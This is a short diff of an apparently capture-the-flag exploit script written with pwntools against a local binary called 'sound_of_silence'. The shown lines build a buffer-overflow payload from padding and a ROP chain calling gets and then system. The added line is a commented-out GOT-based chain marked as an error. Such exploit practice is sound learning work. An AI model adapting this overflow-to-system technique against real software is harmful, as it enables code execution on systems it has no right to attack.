@@ -27,6 +27,7 @@ io = process('./sound_of_silence')
 #io = gdb.debug('./sound_of_silence','break main')
 
 #gets + system
+#rop_chain = p64(elf.got.gets) + p64(elf.got.system)  #ERROR! Should call PLT/SYM!!
 rop_chain = p64(elf.sym.gets) + p64(elf.sym.system)
 
 payload = padding + rop_chain
